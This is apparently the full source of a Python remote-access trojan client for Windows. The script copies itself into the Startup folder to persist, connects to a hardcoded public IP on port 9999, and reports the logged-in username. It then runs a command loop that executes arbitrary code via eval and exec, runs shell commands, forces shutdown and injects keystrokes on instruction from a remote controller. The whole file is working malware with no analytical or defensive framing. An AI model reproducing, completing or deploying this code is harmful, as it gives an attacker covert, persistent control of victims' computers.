import sys
import shutil
import os
import socket
import getpass

os.system("pip install keyboard")

import keyboard

shutil.move(__file__, "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup")

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('172.235.150.60', 9999)) # we use public ip

client.send("0".encode()) # send client status 0

if client.recv(1024).decode() == "202":
    client.send(getpass.getuser().encode())  # send client status 0
    print("confirmed")

    while True: # command loop
        request = client.recv(1024).decode()

        if request.startswith("555-"):  # master client is sending a target command
            command = request.replace("555-", "").split("~")[0]
            args = request.replace("555-", "").split("~")[1]

            print(f"got command: ({command}) with args: ({args})")

            if command == "eval" and args != "":
                eval(args)
            elif command == "exec" and args != "":
                exec(args)
            elif command == "cmd" and args != "":
                os.system(args)
            elif command == "shutdown":
                os.system('shutdown -s')
            elif command == "keystroke" and args != "":
                keyboard.press_and_release(args)